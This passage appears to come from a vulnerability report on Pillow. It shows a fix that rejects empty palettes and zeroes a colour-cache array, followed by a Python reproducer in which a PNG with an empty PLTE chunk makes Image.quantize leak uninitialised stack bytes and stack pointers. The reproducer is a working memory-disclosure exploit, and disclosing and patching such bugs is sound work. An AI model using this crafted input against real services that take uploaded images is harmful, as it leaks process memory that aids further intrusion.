IMAGING_MODE_PA; + if (palette != NULL && palette->size <= 0) { + return (Imaging)ImagingError_ValueError("empty palette"); + } + if (palette == NULL) { /* FIXME: make user configurable */ if (imIn->bands == 1) { diff --git a/src/libImaging/Palette.c b/src/libImaging/Palette.c index b2dacf656..ceb69d3dc 100644 --- a/src/libImaging/Palette.c +++ b/src/libImaging/Palette.c @@ -211,6 +211,7 @@ ImagingPaletteCacheUpdate(ImagingPalette palette, int r, int g, int b) { for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; + c[i] = 0; } for (i = 0; i < palette->size; i++) { ``` ## The reproducer
Reproducer — repro, 2,975 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # Pillow: Image.quantize(palette=

) returns # uninitialised C stack bytes as pixel values. # # ImagingPaletteCacheUpdate() (src/libImaging/Palette.c) only writes its local # UINT8 c[512] inside `for (i = 0; i < palette->size; i++)`. A PNG with a # zero-length PLTE chunk gives palette->size == 0, so c[] is never written and # its raw stack contents are copied into the colour cache, which topalette() # (src/libImaging/Convert.c) then emits as the output pixels. import io import struct import zlib from PIL import Image def png_with_plte(plte): """A 4x4 palette-mode (colour type 3) PNG whose PLTE chunk holds `plte`.""" def chunk(tag, data): return (struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data))) ihdr = struct.pack(">IIBBBBB", 4, 4, 8, 3, 0, 0, 0) pixels = zlib.compress(b"\x00" * 4 * 5) return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"PLTE", plte) + chunk(b"IDAT", pixels) + chunk(b"IEND", b"")) def quantize_against(palette_png): """What an "apply this palette" feature does with an uploaded palette image.""" pal = Image.open(io.BytesIO(palette_png)) # 512 colours, one per slot of the colour-cache box r,g,b in [0,32), in slot # order: output pixel j is exactly c[j] of ImagingPaletteCacheUpdate(). src = Image.new("RGB", (512, 1)) src.putdata([(r * 4, g * 4, b * 4) for r in range(8) for g in range(8) for b in range(8)]) return src.quantize(palette=pal, dither=Image.Dither.NONE).tobytes() def stack_range(): for line in open("/proc/self/maps"): if line.rstrip().endswith("[stack]"): lo, hi = line.split()[0].split("-") return int(lo, 16), int(hi, 16) # Control: a one-entry palette -- every pixel must map to index 0. control = quantize_against(png_with_plte(b"\x10\x20\x30")) print(f"control (1-entry PLTE): distinct pixel values = {sorted(set(control))}") # Attack: the same PNG with an empty PLTE chunk (80 bytes). try: leaked = quantize_against(png_with_plte(b"")) except ValueError as e: print(f"attack (empty PLTE): rejected: {e}") print("OK") raise SystemExit print(f"attack (empty PLTE): {len(set(leaked))} distinct pixel values; first 64 bytes:") print(f" {leaked[:64].hex()}") # Read the 512 pixel bytes as 64 little-endian words; any word that is an # address inside this process's own stack can only have come from the stack. lo, hi = stack_range() print(f"this process's [stack] mapping: {lo:#x}-{hi:#x}") stack_ptrs = 0 for i in range(0, 512, 8): word = int.from_bytes(leaked[i:i + 8], "little") if lo <= word < hi: stack_ptrs += 1 print(f" pixels {i:3d}..{i + 7:3d} = {word:#018x} <- pointer into [stack]") print(f"{stack_ptrs} of 64 words of the output image are stack addresses") print("BUG" if set(control) == {0} and stack_ptrs >= 2 else "OK") ```
